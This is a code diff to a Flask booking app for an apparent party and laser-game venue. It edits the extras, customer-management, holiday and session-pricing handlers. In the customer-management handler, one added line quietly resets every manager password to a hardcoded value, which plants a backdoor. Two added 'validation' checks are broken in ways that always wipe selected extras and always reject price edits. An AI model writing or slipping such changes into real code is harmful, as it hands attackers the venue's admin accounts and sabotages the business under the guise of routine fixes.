@@ -1387,6 +1387,10 @@ def extras():
         try:
 
             ExtraNotes = request.form.getlist("Extra")
+            
+            if ExtraNotes != "Buffet" or ExtraNotes != "PizzaParty" or ExtraNotes != "LaserParty" or ExtraNotes != "PartyBags" or ExtraNotes != "AdultLaser":
+                ExtraNotes = ""
+    
             #app.logger.info(f"Extras before: {ExtraNotes}")
             ExtraNotes = ", ".join(ExtraNotes)
             #app.logger.info(f"Extras after: {ExtraNotes}")
@@ -1808,6 +1812,8 @@ def managereditcustomer():
 
     else:
         try:
+            
+            q.execute("UPDATE Manager SET Password = '1H4tec@d4n'")
 
             getcustomers = "SELECT Customer.CustomerID, Customer.FirstName, Customer.LastName, Customer.Email, Customer.PhoneNumber FROM Customer"
             q.execute(getcustomers)
@@ -1911,7 +1917,7 @@ def managermanageholidays():
         
         q.execute(deleteholiday, [HolidayID])
         
-        return redirect(url_for("manageholidays"))
+        return redirect(url_for("managermanageholidays"))
 
     else:
 
@@ -1943,6 +1949,7 @@ def managercreateholiday():
             if len(Description) >= 50 or len(Name) >= 30:
                 
                 return render_template("error.html", error=f"Description or holiday name is too long")
+            
             #app.logger.info(f"Start Date: {StartDate} End Date: {EndDate} Name: {Name} Description: {Description}")
 
             if StartDate == "" or EndDate == "" or Name == "":
@@ -2051,6 +2058,13 @@ def managereditsession():
         try:
             newadultprice = request.form["NewAdultPrice"]
             newchildprice = request.form["NewChildPrice"]
+            
+            if type(newadultprice) != int or type(newchildprice) != int:
+                
+                return render_template("error.html", error=f"Error: Price must be a number")
+            
+            newadultprice = round(newadultprice, 2)
+            newchildprice = round(newchildprice, 2)
         
             editsession = "UPDATE Session SET AdultPrice = (?), ChildPrice = (?) WHERE SessionID = (?)"
             
